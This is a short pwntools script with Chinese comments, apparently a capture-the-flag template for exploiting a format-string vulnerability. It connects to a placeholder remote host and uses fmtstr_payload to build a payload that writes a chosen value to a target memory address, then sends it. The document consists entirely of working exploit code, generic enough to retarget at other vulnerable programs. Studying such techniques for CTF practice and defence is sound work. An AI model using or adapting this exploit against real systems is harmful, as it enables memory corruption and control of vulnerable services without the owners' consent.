from pwn import *

context.arch = 'i386' # 或 amd64
p = remote('ip', port)

offset = 10               # 测出来的偏移量
target_addr = 0x0804C044  # 目标地址
value_to_write = 4        # 想要写入的值

# 自动生成包含地址、对齐、%c、%n 的完整 Payload
payload = fmtstr_payload(offset, {target_addr: value_to_write})

p.sendline(payload)